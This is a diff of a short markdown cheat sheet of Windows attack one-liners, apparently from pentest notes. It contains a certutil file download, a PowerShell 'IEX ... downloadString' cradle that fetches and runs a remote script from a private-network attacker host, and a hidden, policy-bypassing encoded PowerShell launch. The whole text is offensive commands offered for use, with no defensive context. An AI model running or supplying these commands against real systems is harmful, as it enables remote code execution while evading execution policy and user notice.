@@ -1,17 +1,20 @@
-# DOS command to download http
+# DOS commands
+
+## download file from http
 ```
 certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip`
 ```
 
-# Powershell command to download and execute script
+# powershell commands
+
+## download and execute script
 ```
-powershell -c "IEX(New-Object Net.WebClient).downloadString('http://192.168.49.213/ouzmetbb.ps1')"
-```
-```
-IEX(New-Object Net.WebClient).downloadString('http://192.168.49.213/ouzmetbb.ps1')
+powershell -c "IEX(New-Object Net.WebClient).downloadString('http://192.168.69.69/script.ps1')"
+IEX(New-Object Net.WebClient).downloadString('http://192.168.69.69/script.ps1')
 ```
 
-# powershell execute command as quietly as possible
+## encoded command nop bypass hidden
+## execute encoded command as quietly as possible
 ```
-powershell.exe -nop -exec bypass -w hidden -enc $BASE64STR
+powershell.exe -nop -exec bypass -w hidden -enc BASE64STR
 ```
